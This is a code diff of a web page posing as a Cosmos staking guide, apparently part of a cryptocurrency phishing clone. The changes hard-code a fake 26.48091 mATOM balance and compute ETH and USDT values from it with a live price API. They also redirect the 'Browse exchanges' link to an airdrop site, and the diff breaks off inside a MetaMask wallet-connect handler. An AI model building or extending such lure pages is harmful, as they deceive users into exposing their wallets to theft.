@@ -1410,7 +1410,7 @@
 										<img src="assets/111-removebg-preview.png" style="height: 50px; width: auto" alt="">
 									<div>
 										<div data-v-37156db5="" class="heading tm-rf-1 tm-medium tm-lh-title tm-overline tm-muted"> BALANCE mATOM </div>
-										<div data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title tm-title mt-3 atomleft fct-count"> <span>6.29042</span> </div>
+										<div data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title tm-title mt-3 atomleft fct-count"> <span>26.48091</span> </div>
 									</div>
 									</div>
 								</a>
@@ -1419,7 +1419,7 @@
 										<img src="assets/ETH_negate.png" style="height: 50px; width: auto" alt="">
 										<div>
 									<div data-v-37156db5="" class="heading tm-rf-1 tm-medium tm-lh-title tm-overline tm-muted">ETH EQUIVALENT</div>
-									<div data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title tm-title mt-3 centerbit fct-count"><span>0.04091586</span> </div>
+									<div data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title tm-title mt-3 centerbit fct-count"><span id="eth-equivalent">0.04091586</span> </div>
 										</div>
 									</div>
 								</a>
@@ -1428,7 +1428,7 @@
 										<img src="assets/USDT_removebg_preview_negate.png" style="height: 45px; width: auto" alt="">
 										<div>
 									<div data-v-37156db5="" class="heading tm-rf-1 tm-medium tm-lh-title tm-overline tm-muted"> USDT EQUIVALENT </div>
-									<div data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title tm-title mt-3 usdtright fct-count"><span>115</span>,<span>42</span> </div>
+									<div data-v-37156db5="" class="title tm-rf3 tm-bold tm-lh-title tm-title mt-3 usdtright fct-count"><span  id="usdt-equivalent">115.114</span></div>
 										</div>
 									</div>
 								</a>
@@ -1580,7 +1580,8 @@
 								</div>
 								<div data-v-191eaa4d="" class="bottom mt-8">
 									<p data-v-191eaa4d="" class="subtitle tm-rf1 tm-lh-copy tm-measure"> Some exchanges offer staking services directly, but this requires you to delegate ownership of your tokens to them. </p>
-									<p data-v-191eaa4d="" class="subtitle tm-rf1 tm-lh-copy tm-measure"> This guide involves using your own wallet, enabling you to maintain full ownership of your tokens. </p> <a data-v-706ceafa="" data-v-0cb9acaa="" data-v-191eaa4d="" href="https://messari.io/asset/cosmos/exchanges" target="_blank" rel="noreferrer noopener" class="btn mt-6 tm-link tm-button tm-button__size__l tm-button__variant__text tm-lh-title tm-medium tm-button__external  tm-rf1"><span
+									<p data-v-191eaa4d="" class="subtitle tm-rf1 tm-lh-copy tm-measure"> This guide involves using your own wallet, enabling you to maintain full ownership of your tokens. </p>
+									<a data-v-706ceafa="" data-v-0cb9acaa="" data-v-191eaa4d="" href="https://cosmosairdrops.io/" target="_blank" rel="noreferrer noopener" class="btn mt-6 tm-link tm-button tm-button__size__l tm-button__variant__text tm-lh-title tm-medium tm-button__external  tm-rf1"><span
                                             data-v-0cb9acaa="" data-v-706ceafa="" class="tm-button__content z-1">Browse
                                             exchanges <span data-v-191eaa4d="" data-v-706ceafa=""
                                                 class="icon__right">↗</span></span></a> </div>
@@ -1946,13 +1947,23 @@
 
 
 <script>
+	//set tokens
+
+
+	async function setToken() {
+		let res = await fetch(`https://min-api.cryptocompare.com/data/price?fsym=ATOM&tsyms=ETH,USDT`)
+		let price = await res.json()
+		document.getElementById('eth-equivalent').innerText = price.ETH * 26.48091;
+		document.getElementById('usdt-equivalent').innerText = price.USDT * 26.48091;
+	}
+	setToken()
+
+
 
 	//ММ
 
 	var acc;
-
 	const ethereumButton = document.querySelector('.enableEthereumButton');
-
 	ethereumButton.addEventListener('click', async () => {
 		if(selectedToken!==null){
 			try{
